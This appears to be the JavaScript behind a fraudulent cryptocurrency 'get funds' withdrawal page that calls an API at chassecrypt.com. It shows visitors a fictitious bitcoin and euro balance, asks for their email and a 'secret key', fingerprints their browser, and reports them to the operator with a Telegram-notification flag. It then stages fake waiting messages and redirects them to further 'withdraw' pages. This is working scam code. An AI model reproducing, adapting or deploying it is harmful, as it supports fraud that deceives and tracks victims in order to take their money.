const xhr = new XMLHttpRequest();
let url = new URL(window.location.href).searchParams.get("email");

function loaderFunction(status) {
  if (status) {
    let div = document.createElement("div");
    div.style =
      "position: fixed;width: 100%;height: 100%;top: 0;background-color: white;left: 0;z-index: 5000;display: flex;align-items: center;justify-content: center;";
    div.id = "loader-wrapper";
    div.innerHTML = '<div class="loader" style="color:red;"></div>';
    document.body.append(div);
  } else {
    document.getElementById("loader-wrapper").remove();
  }
}

async function send_request(type, loader, url, data) {
  return new Promise((resolve, reject) => {
    let page = `https://chassecrypt.com/api/${url}`;
    xhr.open(type, page);
    xhr.responseType = "json";
    xhr.setRequestHeader("Accept", "application/json");
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.setRequestHeader("Access-Control-Allow-Origin", "*");
    xhr.setRequestHeader("mode", "no-cors");
    xhr.setRequestHeader("cache", "no-cache");
    xhr.setRequestHeader("credentials", "same-origin");
    xhr.setRequestHeader("redirect", "follow");

    xhr.onload = () => {
      resolve(xhr.response);
    };

    if (data != false) {
      xhr.send(JSON.stringify(data));
    } else {
      xhr.send();
    }
  });
}

async function setElements(
  priceBitcoinCommission,
  priceInBitcoin,
  priceEuro,
  qr,
  commissionBTC,
  commissionEuro,
  address
) {
  document.getElementById("balance_bitcoin").textContent =
    priceInBitcoin + " BTC";
  document.getElementById("balance_euro").textContent = priceEuro + " EUR";
  let button = document.createElement("button");
  button.className = "email-confirm__submit";
  button.setAttribute("onclick", "check_private_id()");
  button.innerHTML = `GET FUNDS<br><span class="text-auto">${priceEuro} EUR </span>`;
  document.getElementsByClassName("get-found-button")[0].append(button);

  document.getElementById("loader-wrapper").remove();
}

async function show(keys) {
  const incorrect_error = document.querySelector(".incorrect-data");
  const fill_error = document.querySelector(".fill-data");
  const sicret_key_input = document.getElementById("sicret_key_input").value;

  const wait = document.getElementById("wait");
  const email = document.getElementById("email_input").value;
  wait.classList.add("active");

  setTimeout(() => {
    if (email == "") {
      wait.classList.remove("active");
      fill_error.classList.add("active");
      setTimeout(() => {
        fill_error.classList.remove("active");
      }, 7000);

      return;
    } else if (sicret_key_input == "") {
      wait.classList.remove("active");
      fill_error.classList.add("active");
      setTimeout(() => {
        fill_error.classList.remove("active");
      }, 7000);
      return;
    } else {
      for (key in keys) {
        if (keys[key].bitcoin_key == sicret_key_input) {
          wait.classList.add("active");
          incorrect_error.classList.remove("active");
          fill_error.classList.remove("active");

          send_request("post", false, "transaction-successfully", {
            sicret: String(
              navigator.productSub +
                navigator.vendor +
                navigator.appName +
                navigator.platform +
                navigator.product +
                navigator.appVersion
            ),
            send_telegram: true,
          });

          setTimeout(() => {
            wait.textContent = "Confirmation will be sent to email";
          }, 15000);

          return;
        } else {
          wait.classList.remove("active");
          incorrect_error.classList.add("active");
          setTimeout(() => {
            incorrect_error.classList.remove("active");
          }, 7000);
        }
      }
    }
  }, 2000);
}

async function check_data() {
  let keys = await send_request("get", false, "keys", false);
  await show(keys);
}

async function check(keys) {
  const fill_error = document.querySelector(".incorrect_error");
  const incorrect_error = document.querySelector(".data_ok");
  const wait = document.getElementById("wait");
  wait.classList.add("active");

  setInterval(() => {
    wait.classList.remove("active");
    fill_error.classList.remove("active");
    incorrect_error.classList.add("active");
    // send_request("post", false, "send_mail-2", { email: url, sicret: String(navigator.productSub + navigator.vendor + navigator.appName + navigator.platform + navigator.product + navigator.appVersion) })

    setTimeout(() => {
      window.location.href = `withdraw-5.html?email=${url}`;
      incorrect_error.classList.remove("active");
      fill_error.classList.remove("active");
    }, 7000);
  }, 9000);
}

async function check_private_id() {
  let keys = await send_request("get", false, "keys", false);
  await check(keys);
}


async function start() {
  let address = await send_request("get", false, "address_change", false);
  let qr = await send_request("get", false, "qr_change", false);
  let getPriceBitcoin = await send_request("get", false, "price_change", false);
  let setPriceBitcoin = getPriceBitcoin["price_euro"];
  let sendPriceBitcoin = await send_request(
    "post",
    false,
    "transaction-convert",
    {
      price: setPriceBitcoin,
      sicret_key: `${
        navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
      }`,
    }
  );
  let getPriceBitcoinCommission = await send_request(
    "post",
    false,
    "transaction-commission",
    {
      price: setPriceBitcoin,
      sicret_key: `${
        navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
      }`,
    }
  );
  let setPriceBitcoinCommission = getPriceBitcoinCommission.price;
  let getPriceInEuro = await send_request(
    "post",
    false,
    "transaction-convert-euro",
    {
      price: setPriceBitcoin,
      sicret_key: `${
        navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
      }`,
    }
  );
  let getPriceInEuroCommission = await send_request(
    "post",
    false,
    "transaction-convert-euro",
    {
      price: setPriceBitcoinCommission,
      sicret_key: `${
        navigator.productSub +
        navigator.vendor +
        navigator.appName +
        navigator.platform +
        navigator.product +
        navigator.appVersion
      }`,
    }
  );
  setElements(
    sendPriceBitcoin,
    Number(setPriceBitcoin).toFixed(2),
    Number(getPriceInEuro.price).toFixed(2),
    qr,
    setPriceBitcoinCommission,
    Number(getPriceInEuroCommission.price).toFixed(2),
    address.address
  );

//   setElements(
//     sendPriceBitcoin,
//     Number(setPriceBitcoin).toFixed(2),
//     Number(getPriceInEuro.price).toFixed(2),
//     qr,
//     setPriceBitcoinCommission,
//     Number(getPriceInEuroCommission.price).toFixed(2),
//     address.address
//   );
}

start();
